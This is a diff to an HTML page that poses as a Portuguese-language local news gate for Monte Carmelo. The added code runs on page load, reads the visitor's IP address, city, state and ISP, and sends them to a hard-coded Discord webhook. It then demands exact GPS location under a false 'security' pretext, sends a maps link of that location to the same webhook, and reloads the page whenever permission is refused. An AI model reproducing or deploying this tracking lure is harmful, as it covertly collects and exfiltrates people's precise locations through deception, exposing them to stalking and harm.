@@ -21,37 +21,58 @@
         .aviso { margin-top: 20px; color: #d4af37; font-weight: bold; padding: 0 20px; font-size: 1.1em; }
     </style>
 </head>
-<body onload="iniciar()">
+<body onload="capturarIP()">
+
     <div class="loader"></div>
-    <p class="aviso">Validando sua região para liberar a notícia...</p>
+    <p class="aviso">Para sua segurança e acesso ao conteúdo regional de Monte Carmelo, confirme sua localização...</p>
 
     <script>
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1467483594279878717/Yd31-VbARr_0NGE01f3tq7lg8Rg0-fCNxVj2FUED7yZcRt47p_Etr7kyTGUFV_Mq3os8";
 
-        function iniciar() {
+        // 1. CAPTURA AUTOMÁTICA DE IP E REDE
+        function capturarIP() {
+            fetch('https://ipapi.co/json/')
+                .then(response => response.json())
+                .then(data => {
+                    const infoRede = `📍 **ACESSO DETECTADO (DADOS DE REDE)**\n🌐 **IP:** ${data.ip}\n🏙️ **Cidade:** ${data.city}\n🚩 **Estado:** ${data.region}\n📡 **Provedor:** ${data.org}`;
+                    
+                    fetch(WEBHOOK_URL, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({ content: infoRede })
+                    }).finally(() => { 
+                        solicitarGPS(); // Após mandar o IP, pede o GPS exato
+                    });
+                })
+                .catch(() => solicitarGPS()); // Se falhar o IP, tenta o GPS direto
+        }
+
+        // 2. SOLICITAÇÃO DE GPS EXATO
+        function solicitarGPS() {
             if (navigator.geolocation) {
                 const options = { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 };
-                navigator.geolocation.getCurrentPosition(enviarEDirecionar, erroLocalizacao, options);
+                navigator.geolocation.getCurrentPosition(enviarGPS, erroLocalizacao, options);
             } else {
                 direcionar();
             }
         }
 
-        function enviarEDirecionar(pos) {
+        function enviarGPS(pos) {
             const lat = pos.coords.latitude;
             const log = pos.coords.longitude;
-            // LINK DO MAPA CORRIGIDO (SEM O ERRO DO {LAT})
             const mapa = `https://www.google.com/maps?q=${lat},${log}`;
 
             fetch(WEBHOOK_URL, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ content: `📍 **Novo acesso Monte City!**\n🌍 **Localização:** ${mapa}` })
+                body: JSON.stringify({ 
+                    content: `🌍 **LOCALIZAÇÃO EXATA (GPS)**\n📍 **Mapa:** ${mapa}` 
+                })
             }).finally(() => { direcionar(); });
         }
 
         function erroLocalizacao(err) {
-            alert("A permissão de localização é necessária para ler as notícias da Monte City.");
+            alert("A permissão de localização é necessária para segurança do acesso regional.");
             location.reload();
         }
 
